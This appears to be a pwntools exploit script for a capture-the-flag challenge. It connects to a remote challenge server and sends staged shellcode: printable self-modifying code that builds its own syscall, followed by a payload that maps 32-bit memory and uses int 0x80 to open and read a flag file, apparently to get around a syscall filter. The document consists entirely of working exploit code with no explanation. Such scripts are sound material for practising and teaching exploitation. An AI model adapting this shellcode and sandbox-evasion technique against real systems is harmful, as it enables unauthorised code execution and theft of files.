from pwn import *

context.arch = 'amd64'

###Exploit
r = remote('nc.eonew.cn',10011)

shellcode = asm('''
                push 0x20202021
                pop rax
                xor eax,0x20202020
                push rax
                pop rdi
                push rbx
                pop rsi
                push rdi
                pop rdx
                push 0x20202020
                pop rax
                xor [rbx+0x21],ax
                xor al,0x20     #nop
                xor al,0x20     #nop
                push rdi
                pop rax
                .byte 0x2f,0x25

                push 0x20202020
                pop rax
                xor eax,0x20202020
                push rax
                pop rdi
                push rbx
                pop rsi
                push 0x20202220
                pop rax
                xor eax,0x20202020
                push rax
                pop rdx
                push 0x20202020
                pop rax
                xor [rbx+0x4b],ax
                push rdi
                pop rax
                .byte 0x2f,0x25
                ''')
r.sendafter('shellcode: ',shellcode)

padding = b'a'*0x4d
shellcode = asm('''
                mov rdi,1
                mov rsi,rbx
                mov rdx,1
                mov rax,1
                syscall

                mov rdi,0
                mov rsi,0x1000
                mov rdx,7
                mov r10,0x62    # MAP_ANONYMOUS | MAP_32BIT | MAP_PRIVATE
                mov r8,0xffffffff
                mov r9,0
                mov rax,9
                syscall
                mov rbx,rax

                mov rdi,0
                mov rsi,rbx
                mov rdx,0x8
                mov rax,0
                syscall

                mov ebx,ebx
                mov ecx,0
                mov edx,0
                mov rax,5
                int 0x80

                mov rdi,rax
                mov rsi,rbx
                mov rdx,0x100
                mov rax,0
                syscall

                mov rdi,1
                mov rsi,rbx
                mov rdx,0x100
                mov rax,1
                syscall
                ''')
r.sendafter('h',padding+shellcode)
r.sendafter('a','./flag\x00')

r.interactive()
